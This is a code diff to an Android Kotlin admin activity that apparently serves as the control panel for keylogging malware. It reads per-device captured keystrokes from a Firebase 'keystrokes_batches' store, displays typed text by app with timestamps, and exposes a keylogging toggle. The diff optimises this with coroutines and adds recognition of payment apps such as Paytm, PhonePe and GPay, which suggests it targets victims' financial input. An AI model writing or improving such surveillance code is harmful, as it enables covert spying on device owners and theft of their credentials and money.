@@ -16,6 +16,10 @@ import com.google.firebase.database.DataSnapshot
 import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ValueEventListener
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -35,12 +39,6 @@ class AdminMainActivity : AppCompatActivity() {
         var keylogging: Boolean = true,
         var notifications: Boolean = true,
         var logFeed: String = "Waiting for telemetry..."
-    )
-
-    data class LogEntry(
-        val timestamp: Long,
-        val appName: String,
-        val text: String
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -86,36 +84,35 @@ class AdminMainActivity : AppCompatActivity() {
         val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
         dbRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                val allEntries = mutableListOf<LogEntry>()
+                CoroutineScope(Dispatchers.IO).launch {
+                    val newDevices = mutableListOf<DeviceModel>()
+                    var totalEvents = 0
 
-                for (child in snapshot.children) {
-                    val deviceName = child.key ?: continue
-                    if (deviceList.none { it.name == deviceName }) {
-                        val device = DeviceModel(deviceName)
-                        deviceList.add(device)
-                        listenToDeviceState(deviceName)
-                        listenToDeviceLogs(deviceName)
-                    }
-                    for (appChild in child.children) {
-                        val rawApp = appChild.key ?: continue
-                        val prettyApp = getPrettyAppName(rawApp)
-                        for (entry in appChild.children) {
-                            val text = entry.child("text").getValue(String::class.java)
-                                ?: entry.child("title").getValue(String::class.java)
-                                ?: entry.child("typedContent").getValue(String::class.java)
-                                ?: continue
-
-                            val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
-                            if (text.isNotBlank() && text != "null") {
-                                allEntries.add(LogEntry(timestampMillis, prettyApp, text))
+                    for (child in snapshot.children) {
+                        val deviceName = child.key ?: continue
+                        var device = deviceList.find { it.name == deviceName }
+                        if (device == null) {
+                            device = DeviceModel(deviceName)
+                            withContext(Dispatchers.Main) {
+                                deviceList.add(device)
+                                listenToDeviceState(deviceName)
+                                listenToDeviceLogs(deviceName)
                             }
                         }
+                        for (appChild in child.children) {
+                            for (entry in appChild.children) {
+                                totalEvents++
+                            }
+                        }
+                        newDevices.add(device)
+                    }
+
+                    withContext(Dispatchers.Main) {
+                        txtTotalDevices.text = deviceList.size.toString()
+                        txtTotalEvents.text = totalEvents.toString()
+                        adapter.notifyDataSetChanged()
                     }
                 }
-
-                txtTotalDevices.text = deviceList.size.toString()
-                txtTotalEvents.text = allEntries.size.toString()
-                adapter.notifyDataSetChanged()
             }
 
             override fun onCancelled(error: DatabaseError) {}
@@ -165,6 +162,10 @@ class AdminMainActivity : AppCompatActivity() {
     private fun getPrettyAppName(pkg: String): String {
         return when {
             pkg.contains("whatsapp", true) -> "WhatsApp"
+            pkg.contains("paytm", true) -> "Paytm"
+            pkg.contains("phonepe", true) -> "PhonePe"
+            pkg.contains("paisa", true) -> "GPay"
+            pkg.contains("navi", true) -> "Navi"
             pkg.contains("chrome", true) -> "Chrome"
             pkg.contains("youtube", true) -> "YouTube"
             pkg.contains("instagram", true) -> "Instagram"
@@ -179,39 +180,38 @@ class AdminMainActivity : AppCompatActivity() {
         val logRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName)
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                val entries = mutableListOf<Triple<Long, String, String>>()
-                val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
+                CoroutineScope(Dispatchers.IO).launch {
+                    val entries = mutableListOf<String>()
+                    val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
 
-                for (appChild in snapshot.children) {
-                    val rawApp = appChild.key ?: continue
-                    val prettyApp = getPrettyAppName(rawApp)
-                    for (entry in appChild.children) {
-                        val text = entry.child("text").getValue(String::class.java)
-                            ?: entry.child("title").getValue(String::class.java)
-                            ?: entry.child("typedContent").getValue(String::class.java)
-                            ?: continue
+                    for (appChild in snapshot.children) {
+                        val rawApp = appChild.key ?: continue
+                        val prettyApp = getPrettyAppName(rawApp)
+                        for (entry in appChild.children) {
+                            val text = entry.child("text").getValue(String::class.java)
+                                ?: entry.child("title").getValue(String::class.java)
+                                ?: entry.child("typedContent").getValue(String::class.java)
+                                ?: continue
 
-                        val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
+                            val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
 
-                        if (text.isNotBlank() && text != "null") {
-                            entries.add(Triple(timestampMillis, prettyApp, text))
+                            if (text.isNotBlank() && text != "null") {
+                                val timeStr = timeFormat.format(Date(timestampMillis))
+                                entries.add("[$timeStr] [$prettyApp] $text")
+                            }
                         }
                     }
-                }
 
-                // Sort newest on top
-                entries.sortByDescending { it.first }
+                    // Take latest 100 entries for zero lag & zero ANR
+                    val cappedEntries = entries.takeLast(100).reversed().joinToString("\n")
 
-                val sb = StringBuilder()
-                for (item in entries) {
-                    val timeStr = timeFormat.format(Date(item.first))
-                    sb.append("[$timeStr] ${item.second}: ${item.third}\n")
-                }
-
-                val index = deviceList.indexOfFirst { it.name == deviceName }
-                if (index != -1) {
-                    deviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded yet."
-                    adapter.notifyItemChanged(index)
+                    withContext(Dispatchers.Main) {
+                        val index = deviceList.indexOfFirst { it.name == deviceName }
+                        if (index != -1) {
+                            deviceList[index].logFeed = if (cappedEntries.isNotBlank()) cappedEntries else "No telemetry recorded yet."
+                            adapter.notifyItemChanged(index)
+                        }
+                    }
                 }
             }
 
